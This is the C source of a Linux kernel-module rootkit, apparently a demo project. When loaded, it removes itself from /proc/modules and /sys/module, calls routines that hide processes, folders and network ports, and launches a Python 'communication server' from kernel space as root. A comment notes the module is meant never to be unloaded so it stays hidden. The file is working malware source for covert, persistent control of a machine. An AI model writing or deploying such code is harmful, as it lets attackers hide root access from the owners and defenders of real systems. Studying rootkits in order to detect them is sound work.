#include "hide_process.h"
#include "hide_folder.h"
#include "hide_netstat.h"

//Environment used for commands
char *userEnv[] = {"HOME=/", "TERM=xterm-256color", "PATH=/sbin:/usr/sbin:/bin:/usr/bin:/tmp:/", NULL};

// ----------------- HIDE MODULE -----------------

/*
Hide LKM
Information is removed from:
    /proc/modules
    /sys/module
*/
void hide_module(void)
{
	//remove from proc/modules	
	list_del(&THIS_MODULE->list);
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
	//remove from sys/module/	
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
}

// ----------------- COMMANDS TO EXECUTE -----------------

/*
Start the communication server
*/
void start_server(void) {
    char *argv[] = { "/bin/bash", "-c", "python3 /etc/rootkit_demo/public/source/server.py &", NULL};
    call_usermodehelper(argv[0], argv, userEnv, UMH_WAIT_PROC);
}


// ----------------- INIT/EXIT FUNCTIONS -----------------


// Function triggered when lkm is loaded
static int __init my_init(void)
{
    hide_module();
    hide_process();
    hide_folder();
    hide_ports();
    
    start_server();

	return 0;
}

// Function triggered when lkm is unloaded (this will never happen)
static void __exit my_exit(void)
{
	// We want to be hidden so this should never be triggered
	// However, they are handy for debugging and trying new
	// things out.
	unhide_process();
	unhide_folder();

	// This does not work properly, after rmmod
	// netstat will be broken
	unhide_ports();
}

module_init(my_init);
module_exit(my_exit);

MODULE_LICENSE("GPL");
